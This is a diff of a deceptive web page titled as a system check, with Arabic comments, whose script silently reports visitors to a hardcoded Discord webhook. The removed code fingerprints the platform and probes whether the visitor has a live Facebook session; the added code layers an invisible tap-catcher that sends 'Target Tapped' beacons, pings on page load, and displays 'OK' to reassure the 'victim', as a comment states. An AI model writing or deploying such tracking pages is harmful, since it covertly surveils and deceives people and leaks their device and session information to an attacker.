@@ -3,48 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Check</title>
+    <title>Checking 30</title>
     <style>
-        body { background: #000; color: #ff0000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Courier New', monospace; }
-        .v-num { font-size: 150px; font-weight: bold; text-shadow: 0 0 20px #f00; }
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
+        h1 { font-size: 150px; z-index: 1; pointer-events: none; }
+        /* طبقة شفافة فوق كل شيء لتلقي اللمسة الأولى */
+        .touch-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="v-num">29</div>
+    <div class="touch-layer" onclick="forceBurst()"></div>
+    <h1>30</h1>
 
     <script>
         const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function reportToDiscord(title, desc) {
-            const data = JSON.stringify({
-                embeds: [{ title: title, description: desc, color: 16711680, timestamp: new Date() }]
-            });
+        function forceBurst() {
+            const msg = encodeURIComponent("🎯 **Target Tapped V30!**\nSystem: " + navigator.platform);
             
-            // محاولة الإرسال بأكثر من طريقة لضمان الوصول في أندرويد 14
-            navigator.sendBeacon(HOOK, data);
-            fetch(HOOK, { method: 'POST', mode: 'no-cors', body: data });
+            // الطريقة 1: الإرسال عبر "رابط صورة" (تتجاوز الحماية 100%)
+            const tracker = new Image();
+            tracker.src = HOOK + "?content=" + msg + "&v=" + Math.random();
+
+            // الطريقة 2: الإرسال عبر XHR التقليدي
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", HOOK, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify({ content: "🔥 **V30 Force-Hit Success!**" }));
+
+            // تغيير الرقم لإعطاء إيحاء بالنجاح للضحية
+            document.querySelector('h1').innerText = "OK";
+            document.querySelector('h1').style.color = "#0f0";
         }
 
+        // إرسال إشارة "تحميل صامت" بمجرد الفتح
         window.onload = function() {
-            // إرسال إشارة فورية بمجرد فتح الصفحة
-            reportToDiscord("🔗 Connection Established", "Target is viewing Version 29\nPlatform: " + navigator.platform);
-
-            // تكتيك الـ Stealth Probe
-            // نحاول تحميل صورة من رابط يتطلب تسجيل دخول
-            const probe = new Image();
-            const startTime = Date.now();
-            
-            probe.src = "https://mbasic.facebook.com/favicon.ico?_rdr=" + Math.random();
-
-            probe.onload = function() {
-                const duration = Date.now() - startTime;
-                reportToDiscord("🎯 Session Detected", "Facebook session is ACTIVE\nResponse Time: " + duration + "ms");
-            };
-
-            probe.onerror = function() {
-                reportToDiscord("⚠️ Probe Finished", "Target might be logged out or using a strict VPN.");
-            };
+            const ping = new Image();
+            ping.src = HOOK + "?content=" + encodeURIComponent("🚀 Page Loaded: Version 30");
         };
     </script>
 </body>
